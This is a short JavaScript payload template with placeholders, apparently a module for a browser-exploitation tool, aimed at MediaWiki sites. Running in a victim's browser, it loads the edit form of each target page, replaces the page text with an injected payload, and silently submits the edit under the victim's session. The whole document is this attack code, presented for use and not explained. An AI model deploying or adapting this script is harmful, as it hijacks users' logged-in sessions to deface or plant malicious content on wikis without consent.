target_pages="%%csv_target_pages%%".split(",");
for (var i = 0; i < target_pages.length; i ++) {
    $.get("%%mw_website_prefix%%" + target_pages[i] + "?action=edit", function (data) {
        edf = $(data).find("form#editform");
        edf_ser = edf.serialize();
        if (!edf_ser.match("%%negative_pattern%%")) {
            edf_ser = edf_ser.replace(/(wpTextbox1=)(?:[^&]*)/g, "$1$2" + "%%urlenc_injection%%");
            $.ajax({
                type : "POST",
                url : edf.attr("action"),
                data : edf_ser
            });
        }
    })
}